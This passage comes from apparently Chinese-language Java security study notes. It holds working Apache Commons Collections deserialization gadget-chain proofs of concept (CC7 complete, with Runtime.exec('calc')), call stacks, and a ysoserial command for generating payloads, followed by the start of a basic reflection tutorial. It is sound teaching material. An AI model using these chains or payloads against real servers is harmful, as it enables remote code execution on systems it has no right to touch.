class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ChainedTransformer实例</span></span><br><span class="line">        <span class="comment">//先设置假的 Transformer 数组，防止生成时执行命令</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//LazyMap实例</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">uselessMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(uselessMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//TiedMapEntry 实例</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射设置真的 ransformer 数组</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> chainedTransformer.getClass().getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(chainedTransformer, transformers);</span><br><span class="line">        <span class="comment">//清空由于 hashMap.put 对 LazyMap 造成的影响</span></span><br><span class="line">        lazyMap.clear();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//测试反序列化</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>大体调用栈：</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里是 jdk 1.7 的，不同版本 HashMap readObject 可能略有不同</span></span><br><span class="line">  -&gt;HashMap.readObject()</span><br><span class="line">      -&gt;HashMap.putForCreate()</span><br><span class="line">          -&gt;HashMap.hash()</span><br><span class="line">            -&gt;TiedMapEntry.hashCode()</span><br><span class="line">                    -&gt;TiedMapEntry.getValue()</span><br><span class="line">                    -&gt;LazyMap.get()</span><br><span class="line">                      -&gt;ChainedTransformer.transform()</span><br><span class="line">                          -&gt;ConstantTransformer.transform()</span><br><span class="line">                              -&gt;InvokerTransformer.transform()</span><br><span class="line">                                  -&gt;…………</span><br></pre></td></tr></table></figure></div><h3 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h3><p><strong>测试环境</strong>：3.1-3.2.1，jdk1.7,1.8</p><p>这里仍然是想法子触发LazyMap.get()。Hashtable 的 readObject 中. 遇到 hash 碰撞时, 通过调用一个对象的 equals 方法对比两个对象判断是真的 hash 碰撞. 这里的 equals 方法是 AbstractMap 的 equals 方法。</p><p>Hashtable 类的关键代码如下：</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Hashtable 的 readObject 方法</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">         <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">       ………………</span><br><span class="line">        <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">            <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K)s.readObject();</span><br><span class="line">            <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V)s.readObject();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//reconstitutionPut方法</span></span><br><span class="line">            reconstitutionPut(newTable, key, value);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.table = newTable;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//跟进 reconstitutionPut 方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;K,V&gt;[] tab, K key, V value)</span></span><br><span class="line">        <span class="keyword">throws</span> StreamCorruptedException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> hash(key);</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;K,V&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//注意这里的 equals 方法</span></span><br><span class="line">            <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Creates the new entry.</span></span><br><span class="line">        Entry&lt;K,V&gt; e = tab[index];</span><br><span class="line">        tab[index] = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(hash, key, value, e);</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>跟进上面的 equals 方法，发现最终调用了 AbstractMap 类的 equals 方法，如下：</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032255270.png"                      alt="image-20230124185509605"                ><figcaption>image-20230124185509605</figcaption></figure></p><blockquote><p>就是在这里触发了 LazyMap.get()。</p></blockquote><p>完整代码</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Apache_Common_Collections.cc_1_7;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections7</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IllegalAccessException, IOException, ClassNotFoundException, NoSuchFieldException &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] fakeTransformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ChainedTransformer实例</span></span><br><span class="line">        <span class="comment">//先设置假的 Transformer 数组，防止生成时执行命令</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//LazyMap实例</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1,chainedTransformer);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2,chainedTransformer);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射设置真的 ransformer 数组</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> chainedTransformer.getClass().getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(chainedTransformer, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//上面的 hashtable.put 会使得 lazyMap2 增加一个 yy=&gt;yy，所以这里要移除</span></span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(hashtable);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//测试反序列化</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>这里需要重复2次重复的添加到<code>Hashtable</code>的操作</p><p><code>Hashtable</code>的<code>reconstitutionPut</code>方法是被遍历调用的</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032255026.png"                      alt="image-20230124191526657"                ><figcaption>image-20230124191526657</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032256026.png"                      alt="image-20230124191546132"                ><figcaption>image-20230124191546132</figcaption></figure></p><p>第一次调用的时候，并不会走入到<code>reconstitutionPut</code>方法for循环里面，因为<code>tab[index]</code>的内容是空的，在下面会对<code>tab[index]</code>进行赋值。在第二次调用<code>reconstitutionPut</code>时，tab中才有内容，我们才有机会进入到这个for循环中，从而调用<code>equals</code>方法。这也是为什么要调用两次put的原因。</p></blockquote><p>大体调用栈：</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里是 jdk 1.7 的，不同版本 HashMap readObject 可能略有不同</span></span><br><span class="line">  -&gt;Hashtable.readObject()</span><br><span class="line">      -&gt;Hashtable.reconstitutionPut()</span><br><span class="line">            -&gt;AbstractMapDecorator.equals</span><br><span class="line">                -&gt;AbstractMap.equals()</span><br><span class="line">                  -&gt;LazyMap.get.get()</span><br><span class="line">                    -&gt;ChainedTransformer.transform()</span><br><span class="line">                      -&gt;ConstantTransformer.transform()</span><br><span class="line">                        -&gt;InvokerTransformer.transform()</span><br><span class="line">                          -&gt;…………</span><br></pre></td></tr></table></figure></div><h3 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h3><p>在java反序列化上有一个里程碑式的工具 <a class="link"   href="https://github.com/frohoff/ysoserial" >ysoserial <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>反序列化漏洞在各个语言里本不是一个新鲜的名词，但2015年Gabriel Lawrence (@gebl)和ChrisFrohoff (@frohoff)在AppSecCali上提出了利用Apache Commons Collections来构造命令执⾏的利用链，并在年底因为对Weblogic、JBoss、Jenkins等著名应用的利用，一石激起千层浪，彻底打开了一片Java安全的蓝海。</p><p>而<strong>ysoserial</strong>就是两位原作者在此议题中释出的一个工具，它可以让用户根据自己选择的利用链，生成反序列化利用数据，通过将这些数据发送给目标，从⽽而执⾏用户预先定义的命令。什么是利用链？</p><p>利用链也叫“gadget chains”，我们通常称为gadget。如果你学过PHP反序列化漏洞，那么就可以将gadget理解为一种方法，它连接的是从触发位置开始到执⾏命令的位置结束，在PHP里可能是 __desctruct 到 eval ；如果你没学过其他语言的反序列化漏洞，那么gadget就是一种生成POC的方法罢了。</p><p>ysoserial的使用也很简单，虽然我们暂时先不理解 CommonsCollections ，但是用ysoserial可以很容易地生成这个gadget对应的POC：</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-30099844c6-1.jar CommonsCollections1 &quot;id&quot;</span><br></pre></td></tr></table></figure></div><p>如上，ysoserial大部分的gadget的参数就是一条命令，比如这里是 id 。生成好的POC发送给目标，如果目标存在反序列化漏洞，并满⾜足这个gadget对应的条件，则命令 id 将被执⾏</p>]]></content>
      
      
      <categories>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反射</title>
      <link href="/2022/08/23/Java%E5%8F%8D%E5%B0%84/"/>
      <url>/2022/08/23/Java%E5%8F%8D%E5%B0%84/</url>
      
        <content type="html"><![CDATA[<h1 id="JAVA反射"><a href="#JAVA反射" class="headerlink" title="JAVA反射"></a>JAVA反射</h1><h2 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h2><h3 id="类加载-x2F-类初始化"><a href="#类加载-x2F-类初始化" class="headerlink" title="类加载&#x2F;类初始化"></a>类加载&#x2F;类初始化</h3><p>三个步骤</p><ul><li><p>类的加载： 将class文件读入内存，并为之创建一个java.lang.Class对象</p><blockquote><p>任何类被使用时，系统都会为之建立一个java.lang.Class对象</p><p><strong>系统中所有的类都是java.lang.Class的实例。</strong></p></blockquote></li><li><p>类的连接</p><ul><li>验证阶段：检验被加载类是否有正确的内部结构，并和其他类协调一致</li><li>准备阶段：负责为类的类变量分配内存，并设置默认初始化值</li><li>解析阶段：将类的二进制数据中的符号引用替换为直接引用</li></ul></li><li><p>类的初始化：主要是对类变量初始化</p><ul><li>假如该类还没被加载和连接，则先加载并连接该类</li><li>假如该类的直接父类还没被初始化，先初始化其直接父类(会向上递归，java中最先初始化的是Object类)</li><li>假如类中有初始化语句，则系统依次执行这些初始化语句</li></ul></li></ul><blockquote><p>类的初始化时机：</p><ul><li>创建类的实例</li><li>调用类的类方法</li><li>访问类或接口的类变量，或为该类变量赋值</li><li>使用反射方式来强制创建某个类或接口对应的java.lang.Class对象</li><li>初始化某个类的子类</li><li>直接使用java.exe命令来运行某个主类</li></ul></blockquote><h3 id="类加载器-1"><a href="#类加载器-1" class="headerlink" title="类加载器"></a>类加载器</h3><p>作用</p><ul><li>将.class文件加载到内存中，并为之生成对应的java.lang.Class对象</li></ul><h3 id="java虚拟机的类加载机制"><a href="#java虚拟机的类加载机制" class="headerlink" title="java虚拟机的类加载机制"></a>java虚拟机的类加载机制</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032250456.jpg"                      alt="image-20220715194607363"                ><figcaption>image-20220715194607363</figcaption></figure></p><blockquote><p>内置类加载器</p><p>Bootstrap class loader–&gt;Platform class loader–&gt;System class loader </p><p>父到子的顺序</p></blockquote><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032251426.jpg"                      alt="image-20220715195009312"                ><figcaption>image-20220715195009312</figcaption></figure></p><h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>指在运行时获取一个类的变量和方法信息，然后通过获取到的信息来创建对象，调用方法的一种机制。由于这种动态性，程序不用在编译器就完成确定，在运行起仍可以拓展</p><h3 id="获取Class对象"><a href="#获取Class对象" class="headerlink" title="获取Class对象"></a>获取Class对象</h3><ul><li>使用类的class属性，e.g. <code>Student.class</code></li><li>调用类的getClass()方法（这是Object类的方法，所有对象都有该方法）</li><li>Class类中的静态方法，forName(String className)，该方法要传入字符串参数，该字符串是某个类的全路径，也就是完整包名的路径</li></ul><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;Student&gt; c1=Student.class;</span><br><span class="line">System.out.println(c1);</span><br><span class="line">Class&lt;Student&gt; c2=Student.class;</span><br><span class="line">System.out.println(c1==c2);<span class="comment">//true，一个类在内存中只有一个字节码对象</span></span><br><span class="line">Student s=<span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">Class&lt;? <span class="keyword">extends</span> <span class="title class_">Student</span>&gt; c3=s.getClass();</span><br><span class="line">System.out.println(c1==c3);<span class="comment">//true</span></span><br><span class="line">Class&lt;?&gt; c4=Class.forName(<span class="string">&quot;com.itheima.Student&quot;</span>);<span class="comment">//forName要抛出异常ClassNotFoundException</span></span><br><span class="line">System.out.println(c1==c4);<span class="comment">//true</span></span><br></pre></td></tr></table></figure></div><h3 id="反射构造方法"><a href="#反射构造方法" class="headerlink" title="反射构造方法"></a>反射构造方法</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032251807.jpg"                      alt="image-20220715214817907"                ><figcaption>image-20220715214817907</figcaption></figure></p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//反射构造方法并使用</span></span><br><span class="line">Class&lt;?&gt; c=Class.forName(<span class="string">&quot;com.itheima.Student&quot;</span>);</span><br><span class="line"><span class="comment">//得到所有public权限构造函数（私有默认的不能）</span></span><br><span class="line">Constructor&lt;?&gt;[] cons=c.getConstructors();</span><br><span class="line"><span class="keyword">for</span>(Constructor con:cons)&#123;</span><br><span class="line">  System.out.println(con);</span><br><span class="line">&#125;</span><br><span class="line">Constructor&lt;?&gt;[] cons2=c.getDeclaredConstructors();<span class="comment">//得到所有权限的构造函数</span></span><br><span class="line"><span class="keyword">for</span>(Constructor con:cons2)</span><br><span class="line">&#123;</span><br><span class="line">  System.out.println(con);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//获得指定构造函数</span></span><br><span class="line"><span class="comment">//参数</span></span><br><span class="line">Constructor&lt;?&gt; con=c.getConstructor();<span class="comment">//得到单个构造方法</span></span><br><span class="line"><span class="comment">//提供单个构造函数信息和访问权限</span></span><br><span class="line">Object obj=con.newInstance();<span class="comment">//根据构造方法创建对象</span></span><br><span class="line">System.out.println(obj);</span><br></pre></td></tr></table></figure></div><blockquote><p>基本数据类型也可以通过.class方法得到class对象，getConstructor方法需要传入的参数都是class类型，并且是当前想要访问的构造方法的形参</p></blockquote><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//反射练习</span></span><br><span class="line">Class&lt;?&gt; c=Class.forName(<span class="string">&quot;com.itheima.Student&quot;</span>);</span><br><span class="line"><span class="comment">//public Student(String name, int age,String address);</span></span><br><span class="line">Constructor&lt;?&gt; con = c.getConstructor(String.class, <span class="type">int</span>.class, String.class);</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> con.newInstance(<span class="string">&quot;sqhy&quot;</span>, <span class="number">4781</span>, <span class="string">&quot;339&quot;</span>);</span><br><span class="line">System.out.println(obj);</span><br><span class="line"><span class="comment">//访问私有构造函数</span></span><br><span class="line"><span class="comment">//实现 Student s=new Student(&quot;sqhy&quot;);System.out.println(s);</span></span><br><span class="line">Class&lt;?&gt; c1=Class.forName(<span class="string">&quot;com.itheima.Student&quot;</span>);</span><br><span class="line"><span class="comment">//private Student(String name);</span></span><br><span class="line">Constructor&lt;?&gt; con1=c1.getDeclaredConstructor(String.class);</span><br><span class="line"><span class="comment">//暴力反射</span></span><br><span class="line"><span class="comment">//public void setAccessible (boolean flag):值为true时，取消访问检查</span></span><br><span class="line">con1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">Object obj1=con1.newInstance(<span class="string">&quot;sqhy&quot;</span>);</span><br><span class="line">System.out.println(obj1);</span><br></pre></td></tr></table></figure></div><blockquote><ul><li>getDeclaredConstructor可获取所有访问权限的构造方法</li><li>getConstructor只能得到public权限的构造方法</li></ul><p>遍历数组简便写法</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(Field filed: fields)&#123;</span><br><span class="line">    System.out.println(filed);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></blockquote><h3 id="通过反射得到成员变量"><a href="#通过反射得到成员变量" class="headerlink" title="通过反射得到成员变量"></a>通过反射得到成员变量</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032251759.jpg"                      alt="image-20220716012613059"                ><figcaption>image-20220716012613059</figcaption></figure></p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 